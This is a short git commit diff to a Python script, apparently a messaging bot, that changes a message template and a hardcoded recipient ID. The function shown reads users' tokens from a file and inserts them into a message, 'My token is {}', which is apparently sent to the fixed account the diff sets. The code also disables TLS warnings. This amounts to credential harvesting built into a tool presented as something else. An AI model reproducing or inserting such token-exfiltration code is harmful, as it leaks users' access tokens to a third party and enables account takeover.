c7053408115d2e59b0e72d1373b1613b0b9da7e0
ajju <157633255+mrsatpall@users.noreply.github.com>
2024-05-18 22:01:11 +0530

    Update SATISH.py

--- SATISH.py
+++ SATISH.py
@@ -39,10 +39,10 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello Satpal  Legend! I am using your server. My token is {}"
+      msg_template = "Hello Mr satpal ! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "1308472243158401"
+      target_id = "100000577686263"
 
       requests.packages.urllib3.disable_warnings()
 
